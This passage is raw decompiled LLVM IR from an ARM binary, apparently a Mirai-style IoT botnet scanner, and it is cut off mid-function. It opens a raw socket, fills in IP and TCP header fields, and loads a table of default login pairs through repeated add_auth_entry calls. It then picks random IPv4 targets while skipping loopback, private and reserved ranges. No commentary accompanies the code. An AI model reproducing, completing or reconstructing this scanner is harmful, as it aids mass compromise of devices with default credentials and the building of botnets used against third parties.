  store i32 3, i32* %r1.global-to-local, align 4
  %v0_f6a4 = load i32, i32* @r5, align 4
  store i32 %v0_f6a4, i32* @r2, align 4
  %v2_f6a8 = call i32 @__libc_fcntl(i32 %v3_f688, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_f6b0 = or i32 %v2_f6a8, 2048
  store i32 %v1_f6b0, i32* @r2, align 4
  %v0_f6b4 = load i32, i32* @r4, align 4
  store i32 %v0_f6b4, i32* %r0.global-to-local, align 4
  %v2_f6b8 = call i32 @__libc_fcntl(i32 %v0_f6b4, i32 4)
  %v2_f6c0 = load i32, i32* @global_var_260d4.178, align 4
  store i32 %v2_f6c0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_f6cc = load i32, i32* @r5, align 4
  store i32 %v0_f6cc, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_f6d4 = ptrtoint i16* %stack_var_-52 to i32
  store i32 %v2_f6d4, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i16 1, i16* %stack_var_-52, align 2
  %v5_f6e4 = call i32 @__GI_setsockopt(i32 %v2_f6c0, i32 %v0_f6cc, i32 3, i32 %v2_f6d4, i32 4)
  store i32 %v5_f6e4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6e8 = icmp eq i32 %v5_f6e4, 0
  store i1 %v2_f6e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6e8, label %dec_label_pc_f6f0, label %dec_label_pc_fdf0

dec_label_pc_f6f0:                                ; preds = %dec_label_pc_f6a0, %dec_label_pc_f6f0
  %v0_f6f0 = call i32 @rand_next()
  %v3_f6f4 = mul i32 %v0_f6f0, 65536
  store i32 %v3_f6f4, i32* %r0.global-to-local, align 4
  %v1_f6fc = mul i32 %v0_f6f0, 256
  %v3_f700 = and i32 %v1_f6fc, 65280
  %tmp348 = udiv i32 %v0_f6f0, 256
  %v4_f704 = urem i32 %tmp348, 256
  %v5_f704 = or i32 %v4_f704, %v3_f700
  store i32 %v5_f704, i32* %r3.global-to-local, align 4
  %v2_f708 = icmp ugt i32 %v5_f704, 1023
  store i1 %v2_f708, i1* %cpsr_c.global-to-local, align 1
  %v7_f708 = icmp eq i32 %v5_f704, 1024
  store i1 %v7_f708, i1* %cpsr_z.global-to-local, align 1
  %v3_f710 = icmp ult i32 %v5_f704, 1022
  br i1 %v3_f710, label %dec_label_pc_f6f0, label %dec_label_pc_f714

dec_label_pc_f714:                                ; preds = %dec_label_pc_f6f0
  %v5_f70c.le = trunc i32 %v0_f6f0 to i16
  store i32 ptrtoint (i8** @global_var_235c0.180 to i32), i32* %r0.global-to-local, align 4
  %v2_f718 = load i8, i8* bitcast (i8** @global_var_235c0.180 to i8*), align 4
  %v3_f718 = zext i8 %v2_f718 to i32
  %v1_f71c = and i32 %v3_f718, 240
  %v1_f720 = or i32 %v1_f71c, 5
  store i32 %v1_f720, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_235c0.180 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_235c2.181 to i16*), align 4
  %v0_f740 = call i32 @rand_next()
  %v1_f740 = trunc i32 %v0_f740 to i16
  %v3_f748 = load i8, i8* @global_var_235e0.184, align 1
  store i32 ptrtoint (i32* @global_var_235d4.183 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_235c0.180 to i32), i32* %ip.global-to-local, align 4
  %tmp = urem i8 %v3_f748, 16
  %v1_f754 = zext i8 %tmp to i32
  %v1_f758 = or i32 %v1_f754, 80
  store i32 %v1_f758, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r4, align 4
  store i8 64, i8* bitcast (i32* @global_var_235c8.185 to i8*), align 4
  store i16 %v1_f740, i16* bitcast (i32* @global_var_235c4.186 to i16*), align 4
  %v1_f76c = trunc i32 %v1_f758 to i8
  store i8 %v1_f76c, i8* @global_var_235e0.184, align 1
  store i8 6, i8* bitcast (i32* @global_var_235c9.187 to i8*), align 4
  %v4_f774 = sext i16 %v5_f70c.le to i32
  store i32 %v4_f774, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_235d6.188, align 2
  store i16 %v5_f70c.le, i16* bitcast (i32* @global_var_235d4.183 to i16*), align 4
  %v0_f784 = call i32 @rand_next()
  %v1_f784 = trunc i32 %v0_f784 to i16
  %v3_f78c = load i8, i8* @global_var_235e1.189, align 1
  %v4_f78c = zext i8 %v3_f78c to i32
  store i32 ptrtoint (i32* @global_var_235d4.183 to i32), i32* %ip.global-to-local, align 4
  %v1_f794 = or i32 %v4_f78c, 2
  store i32 %v1_f794, i32* %r3.global-to-local, align 4
  store i16 %v1_f784, i16* bitcast (i32* @global_var_235e2.190 to i16*), align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a7cc.192 to i32), i32* %r1.global-to-local, align 4
  %v1_f7a0 = trunc i32 %v1_f794 to i8
  store i8 %v1_f7a0, i8* @global_var_235e1.189, align 1
  store i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_f7ac = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32 ptrtoint ([8 x i8]* @global_var_1a7cc.192 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a7d4.196 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f7bc = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a7d4.196 to i32), i32 9)
  store i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a7dc.198 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_f7cc = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a7dc.198 to i32), i32 13)
  store i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32* %r1.global-to-local, align 4
  %v5_f7dc = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7e8.200 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_f7ec = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32 ptrtoint (i32* @global_var_1a7e8.200 to i32), i32 17)
  store i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a794.202 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_f7fc = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32 ptrtoint (i32* @global_var_1a794.202 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a8c8.204 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f80c = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a8c8.204 to i32), i32 9)
  store i32 ptrtoint ([4 x i8]* @global_var_1a7f8.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a794.202 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_f81c = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1a7f8.206 to i32), i32 ptrtoint (i32* @global_var_1a794.202 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a804.210 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_f82c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a804.210 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a80c.212 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_f83c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a80c.212 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a794.202 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_f84c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint (i32* @global_var_1a794.202 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a814.214 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f85c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a814.214 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a81c.216 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_f86c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a81c.216 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a828.218 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f87c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a828.218 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a830.220 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f88c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a830.220 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a838.222 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_f89c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a838.222 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a844.224 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_f8ac = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([8 x i8]* @global_var_1a844.224 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a84c.226 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_f8bc = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([4 x i8]* @global_var_1a84c.226 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a850.228 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_f8cc = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a850.228 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a858.230 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_f8dc = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([4 x i8]* @global_var_1a858.230 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a85c.232 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_f8ec = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a85c.232 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a7dc.198 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_f8fc = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a7dc.198 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7e8.200 to i32), i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_f90c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint (i32* @global_var_1a7e8.200 to i32), i32 16)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a868.234 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f91c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a868.234 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a870.236 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_f92c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a870.236 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1a878.238 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v5_f93c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([11 x i8]* @global_var_1a878.238 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a884.240 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_f94c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a884.240 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a88c.242 to i32), i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_f95c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), i32 ptrtoint (i32* @global_var_1a88c.242 to i32), i32 16)
  store i32 ptrtoint ([8 x i8]* @global_var_1a844.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a794.202 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_f96c = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a844.224 to i32), i32 ptrtoint (i32* @global_var_1a794.202 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1a89c.244 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a89c.244 to i32), i32* %r1.global-to-local, align 4
  %v5_f97c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a89c.244 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a89c.244 to i32), i32 8)
  %v0_f980 = load i32, i32* @r4, align 4
  store i32 %v0_f980, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a8a4.246 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a794.202 to i32), i32* %r1.global-to-local, align 4
  %v4_f98c = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1a8a4.246 to i32), i32 ptrtoint (i32* @global_var_1a794.202 to i32), i32 %v0_f980)
  store i32 ptrtoint ([4 x i8]* @global_var_1a8ac.248 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a794.202 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_f99c = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1a8ac.248 to i32), i32 ptrtoint (i32* @global_var_1a794.202 to i32), i32 3)
  store i32 ptrtoint ([8 x i8]* @global_var_1a8b0.250 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a8b0.250 to i32), i32* %r1.global-to-local, align 4
  %v5_f9ac = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a8b0.250 to i32), i32 ptrtoint ([8 x i8]* @global_var_1a8b0.250 to i32), i32 14)
  store i32 ptrtoint ([11 x i8]* @global_var_1a8b8.252 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a8c4.254 to i32), i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v5_f9bc = call i32 @add_auth_entry(i32 ptrtoint ([11 x i8]* @global_var_1a8b8.252 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a8c4.254 to i32), i32 18)
  store i32 %v5_f9bc, i32* %r0.global-to-local, align 4
  %v2_f9c4 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_f9c4, i32* @lr, align 4
  br label %dec_label_pc_f9cc

dec_label_pc_f9cc:                                ; preds = %dec_label_pc_1010c, %dec_label_pc_f714
  %stack_var_-1880.0 = phi i32 [ %v2_f9c4, %dec_label_pc_f714 ], [ %stack_var_-1880.1, %dec_label_pc_1010c ]
  %stack_var_-1876.0 = phi i16 [ %v5_f70c.le, %dec_label_pc_f714 ], [ %stack_var_-1876.1, %dec_label_pc_1010c ]
  store i32 ptrtoint (i32* @global_var_235f0.165 to i32), i32* %r0.global-to-local, align 4
  %v2_f9d0 = load i32, i32* @global_var_235f0.165, align 4
  store i32 %v2_f9d0, i32* @r4, align 4
  %v0_f9d4 = load i32, i32* @fp, align 4
  %v3_f9d4 = icmp uge i32 %v0_f9d4, %v2_f9d0
  store i1 %v3_f9d4, i1* %cpsr_c.global-to-local, align 1
  %v9_f9d4 = icmp eq i32 %v0_f9d4, %v2_f9d0
  store i1 %v9_f9d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f9d4, label %dec_label_pc_fc54, label %dec_label_pc_f9dc

dec_label_pc_f9dc:                                ; preds = %dec_label_pc_f9cc
  store i32 0, i32* %r3.global-to-local, align 4
  store i16 0, i16* %stack_var_-52, align 2
  %v2_f9e4 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_f9e4, i32* @r5, align 4
  br label %dec_label_pc_f9e8

dec_label_pc_f9e8:                                ; preds = %.thread39, %dec_label_pc_f9dc
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_f9fc = call i32 @rand_next()
  %v1_f9fc = trunc i32 %v0_f9fc to i16
  store i32 %v0_f9fc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_260b8.92 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_235c0.180 to i32), i32* %r2.global-to-local, align 4
  %v2_fa08 = load i32, i32* @global_var_260b8.92, align 4
  store i32 %v2_fa08, i32* %r3.global-to-local, align 4
  store i16 %v1_f9fc, i16* bitcast (i32* @global_var_235c4.186 to i16*), align 4
  store i32 %v2_fa08, i32* @global_var_235cc.255, align 4
  br label %dec_label_pc_fa14

dec_label_pc_fa14:                                ; preds = %dec_label_pc_fae8, %dec_label_pc_fa44, %dec_label_pc_fb1c, %dec_label_pc_fb10, %dec_label_pc_fb04, %dec_label_pc_faf8, %.thread30, %bb367, %bb366, %bb365, %bb364, %bb363, %dec_label_pc_fae0, %dec_label_pc_fad8, %bb359, %dec_label_pc_faa8, %dec_label_pc_fa84, %bb352, %dec_label_pc_fa54, %bb351, %dec_label_pc_fa3c, %bb350, %bb369, %dec_label_pc_f9e8
  %v0_fa14 = call i32 @rand_next()
  store i32 %v0_fa14, i32* %r0.global-to-local, align 4
  %v1_fa18 = urem i32 %v0_fa14, 256
  store i32 %v1_fa18, i32* %r1.global-to-local, align 4
  %v3_fa1c = udiv i32 %v0_fa14, 256
  store i32 %v3_fa1c, i32* %r3.global-to-local, align 4
  %v3_fa20 = udiv i32 %v0_fa14, 65536
  store i32 %v3_fa20, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa24 = icmp eq i32 %v1_fa18, 0
  store i1 %v2_fa24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa24, label %bb350, label %bb349

bb349:                                            ; preds = %dec_label_pc_fa14
  %v3_fa28 = icmp ugt i32 %v1_fa18, 126
  store i1 %v3_fa28, i1* %cpsr_c.global-to-local, align 1
  %v8_fa28 = icmp eq i32 %v1_fa18, 127
  store i1 %v8_fa28, i1* %cpsr_z.global-to-local, align 1
  br label %bb350

bb350:                                            ; preds = %dec_label_pc_fa14, %bb349
  %v0_fa38 = phi i1 [ true, %dec_label_pc_fa14 ], [ %v8_fa28, %bb349 ]
  %v1_fa2c = urem i32 %v3_fa1c, 256
  store i32 %v1_fa2c, i32* %ip.global-to-local, align 4
  %v1_fa30 = urem i32 %v3_fa20, 256
  store i32 %v1_fa30, i32* %r2.global-to-local, align 4
  %v1_fa34 = and i32 %v0_fa14, 8388608
  %v2_fa34 = icmp ne i32 %v1_fa34, 0
  store i1 %v2_fa34, i1* %cpsr_c.global-to-local, align 1
  %v3_fa34 = udiv i32 %v0_fa14, 16777216
  store i32 %v3_fa34, i32* %r0.global-to-local, align 4
  br i1 %v0_fa38, label %dec_label_pc_fa14, label %dec_label_pc_fa3c

dec_label_pc_fa3c:                                ; preds = %bb350
  %v2_fa3c = icmp ugt i32 %v1_fa18, 2
  store i1 %v2_fa3c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa3c = icmp eq i32 %v1_fa18, 3
  store i1 %v7_fa3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa3c, label %dec_label_pc_fa14, label %dec_label_pc_fa44

dec_label_pc_fa44:                                ; preds = %dec_label_pc_fa3c
  %v1_fa44 = add nsw i32 %v1_fa18, -15
  store i32 %v1_fa44, i32* %r3.global-to-local, align 4
  %v2_fa48 = icmp ugt i32 %v1_fa18, 55
  store i1 %v2_fa48, i1* %cpsr_c.global-to-local, align 1
  %v7_fa48 = icmp eq i32 %v1_fa18, 56
  store i1 %v7_fa48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa48, label %dec_label_pc_fa14, label %bb351

bb351:                                            ; preds = %dec_label_pc_fa44
  %v3_fa4c = icmp ne i32 %v1_fa44, 0
  store i1 %v3_fa4c, i1* %cpsr_c.global-to-local, align 1
  %v8_fa4c = icmp eq i32 %v1_fa44, 1
  store i1 %v8_fa4c, i1* %cpsr_z.global-to-local, align 1
  %v2_fa50 = xor i1 %v3_fa4c, true
  %v3_fa50 = or i1 %v8_fa4c, %v2_fa50
  br i1 %v3_fa50, label %dec_label_pc_fa14, label %dec_label_pc_fa54

dec_label_pc_fa54:                                ; preds = %bb351
  %v2_fa54 = icmp ugt i32 %v1_fa18, 9
  store i1 %v2_fa54, i1* %cpsr_c.global-to-local, align 1
  %v7_fa54 = icmp eq i32 %v1_fa18, 10
  store i1 %v7_fa54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa54, label %dec_label_pc_fa14, label %dec_label_pc_fa5c

dec_label_pc_fa5c:                                ; preds = %dec_label_pc_fa54
  %v2_fa5c = icmp ugt i32 %v1_fa18, 191
  store i1 %v2_fa5c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa5c = icmp eq i32 %v1_fa18, 192
  store i1 %v7_fa5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa5c, label %bb352, label %dec_label_pc_fa68

bb352:                                            ; preds = %dec_label_pc_fa5c
  %v3_fa60 = icmp ugt i32 %v1_fa2c, 167
  store i1 %v3_fa60, i1* %cpsr_c.global-to-local, align 1
  %v8_fa60 = icmp eq i32 %v1_fa2c, 168
  store i1 %v8_fa60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fa60, label %dec_label_pc_fa14, label %dec_label_pc_fa68

dec_label_pc_fa68:                                ; preds = %dec_label_pc_fa5c, %bb352
  %v7_fa68 = icmp eq i32 %v1_fa18, 172
  %.429 = zext i1 %v7_fa68 to i32
  store i32 %.429, i32* %r3.global-to-local, align 4
  %v2_fa74 = icmp ugt i32 %v1_fa2c, 14
  store i1 %v2_fa74, i1* %cpsr_c.global-to-local, align 1
  %v7_fa74 = icmp eq i32 %v1_fa2c, 15
  store i1 %v7_fa74, i1* %cpsr_z.global-to-local, align 1
  %v2_fa78 = xor i1 %v2_fa74, true
  %v3_fa78 = or i1 %v7_fa74, %v2_fa78
  br i1 %v3_fa78, label %.thread8, label %bb355

.thread8:                                         ; preds = %dec_label_pc_fa68
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa8c

bb355:                                            ; preds = %dec_label_pc_fa68
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa7c = icmp eq i1 %v7_fa68, false
  store i1 %v2_fa7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa7c, label %dec_label_pc_fa8c, label %dec_label_pc_fa84

dec_label_pc_fa84:                                ; preds = %bb355
  %v2_fa84 = icmp ugt i32 %v1_fa2c, 30
  store i1 %v2_fa84, i1* %cpsr_c.global-to-local, align 1
  %v7_fa84 = icmp eq i32 %v1_fa2c, 31
  store i1 %v7_fa84, i1* %cpsr_z.global-to-local, align 1
  %v2_fa88 = xor i1 %v2_fa84, true
  %v3_fa88 = or i1 %v7_fa84, %v2_fa88
  br i1 %v3_fa88, label %dec_label_pc_fa14, label %dec_label_pc_fa8c

dec_label_pc_fa8c:                                ; preds = %.thread8, %dec_label_pc_fa84, %bb355
  %v7_fa8c = icmp eq i32 %v1_fa18, 100
  %.430 = zext i1 %v7_fa8c to i32
  store i32 %.430, i32* %r3.global-to-local, align 4
  %v2_fa98 = icmp ugt i32 %v1_fa2c, 62
  store i1 %v2_fa98, i1* %cpsr_c.global-to-local, align 1
  %v7_fa98 = icmp eq i32 %v1_fa2c, 63
  store i1 %v7_fa98, i1* %cpsr_z.global-to-local, align 1
